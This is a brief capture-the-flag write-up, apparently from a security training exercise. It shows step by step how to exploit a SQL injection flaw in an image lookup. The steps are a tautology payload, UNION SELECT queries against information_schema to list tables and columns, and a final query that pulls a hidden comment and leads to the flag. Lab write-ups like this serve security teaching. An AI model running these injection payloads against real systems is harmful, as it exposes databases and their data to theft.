First, try the most basic SQL Injection there is:
    1 OR 1=1
And immediately you get the results that shows it works. Meaning that the server
uses straight SQL quiries in it's code and at the end has WHERE id=<user_input>

Among the info from our first query there is a clue:
    Title: Hack me ?
    Url : borntosec.ddns.net/images.png

In a clue you have another clue 'images.png' that hints you to look for images table
in the database. After trying different SELECTs with wildecard (*) and different number
of parameters you find that the hack only works with 2.

So, now it's time to find images table and columns for it:
    1 OR 1=1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns
At the end you find 'list_images' table with the following columns:
    id
    url
    title
    comment

After trying them all you find that the one you're looking for is 'comment',
but since the hack only works when there are 2 selected,
so you should include any other column, ex. 'title':
    1 UNION SELECT comment, title FROM list_images
By following the comment's instructions you get the flag.
    `md5 decode` gets you "albatroz"
    `echo -n "albatroz" | shasum -a 256` gets you the flag
